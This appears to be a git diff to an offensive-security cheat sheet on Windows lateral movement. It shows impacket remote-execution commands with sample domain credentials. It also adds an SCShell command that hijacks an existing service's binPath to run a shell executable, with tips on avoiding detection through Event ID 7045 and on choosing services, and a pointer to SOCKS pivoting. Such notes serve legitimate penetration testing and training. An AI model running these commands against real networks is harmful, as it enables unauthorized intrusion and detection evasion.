@@ -99,3 +99,23 @@ impacket-smbexec CORP/Administrator:'Password1'@10.10.10.10
 impacket-atexec CORP/Administrator:'Password1'@10.10.10.10 "whoami"
 impacket-dcomexec CORP/Administrator:'Password1'@10.10.10.10
 ```
+
+---
+
+## SCShell (Service-Modify, No New Service)
+
+Modifies an existing service's `binPath`, triggers it, then restores the original — no service creation (no Event ID 7045), no file written to SMB, no named pipe. Quieter than PsExec when you have SERVICE_CHANGE_CONFIG.
+
+```bash
+scshell.py CORP/Administrator:'Password1'@10.10.10.10 xps 'C:\Temp\shell.exe'
+```
+
+Args: `<user>:<pass>@<host> <service-name> <command>`. Pick a rarely-used service like `XblAuthManager`, `RemoteRegistry`, or `Spooler` to reduce operational impact.
+
+---
+
+## SOCKS Pivot After Foothold
+
+Once you have a shell on an internal host, a SOCKS proxy lets you run `nxc`, `evil-winrm`, and Impacket tools from your attacker box against the rest of the internal network without hopping through the shell manually.
+
+See [Ligolo-ng & Chisel](../port-forwarding/ligolo-chisel.md) — ligolo-ng is the most reliable option for AD internal pivoting.
